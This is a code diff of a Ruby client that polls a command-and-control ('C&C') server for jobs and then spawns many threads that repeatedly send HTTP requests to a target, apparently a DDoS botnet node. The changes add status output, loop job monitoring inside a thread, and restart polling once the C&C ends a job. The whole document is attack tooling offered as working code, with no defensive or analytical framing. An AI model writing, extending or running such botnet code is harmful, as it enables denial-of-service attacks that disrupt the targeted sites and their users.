@@ -17,6 +17,7 @@ class Client
 		# Make sure we can reach C&C
 		cc_stability_test
 
+		puts "(+) Polling for Job..."
 		while @has_job == false
 			# Poll
 			job = request_job
@@ -51,13 +52,15 @@ class Client
 	end
 
 	def kick_off_job!
-		puts "Kicking off job with #{@thread_count} threads"
+		puts "(+) Job recieved. Kicking it off with #{@thread_count} threads"
 		monitor_thread_id = @thread_count + 1
 
 		job_threads = (1..monitor_thread_id).map do |i|
 			Thread.new(i) do |i|
 				if i == monitor_thread_id
-					monitor_job_status
+					while @has_job
+						monitor_job_status
+					end
 				else
 					while @has_job
 						send_request
@@ -67,11 +70,14 @@ class Client
 		end
 
 		job_threads.each {|t| t.join }
+
+		puts "(+) Job has been stopped by C&C"
+		puts "(+) Beginning search for new job"
+		invoke
 	end
 
 	def send_request
 		req = Mechanize.new
-		puts "initiating request to: #{@http_uri} on thread "
 
 		if @http_method.downcase == "get"
 			begin
@@ -87,28 +93,24 @@ class Client
 	end
 
 	def monitor_job_status
-		# This will want to be timed, rather than a constant loop
-		while @has_job
-			puts "Checking job status for job #{@job_id} on node #{@node_id}"
-			endpoint = "#{@server}/poll/#{@node_id}/#{@job_id}"
+		puts "Checking job status for job #{@job_id} on node #{@node_id}"
+		endpoint = "#{@server}/poll/#{@node_id}/#{@job_id}"
 
-			begin
-				response = Mechanize.new.get(endpoint)
-				# Parse response
-				response_parsed = JSON.parse(response.body)
-				
-				puts response_parsed
-				if response_parsed["status"] == "active"
-					return response_parsed
-				else
-					@has_job = false
-					return false
-				end
-			rescue
-				# Ehh, let it slide for now.
-				# Eventually there should be an error counter that kills
-				# jobs based on a certain number of unsuccessful attempts
+		begin
+			response = Mechanize.new.get(endpoint)
+			# Parse response
+			response_parsed = JSON.parse(response.body)
+			
+			if response_parsed["status"] == "active"
+				return response_parsed
+			else
+				@has_job = false
+				return false
 			end
+		rescue
+			# Ehh, let it slide for now.
+			# Eventually there should be an error counter that kills
+			# jobs based on a certain number of unsuccessful attempts
 		end
 	end
 
